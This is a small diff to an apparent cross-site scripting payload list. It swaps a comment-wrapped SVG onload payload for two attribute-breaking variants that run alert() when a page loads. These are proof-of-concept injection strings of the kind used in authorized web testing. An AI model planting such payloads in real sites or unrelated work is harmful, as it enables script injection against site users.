@@ -1,11 +1,11 @@
 # XSS Payload
 ###
 ```
-<!--><Svg OnLoad=(confirm)(1)-->
+ "><svg onload=alert()
 ```
 ###
 ```
-<!--><Svg OnLoad=(confirm)(1)-->
+'><svg onload=alert()>
 ```
 ###
 ```
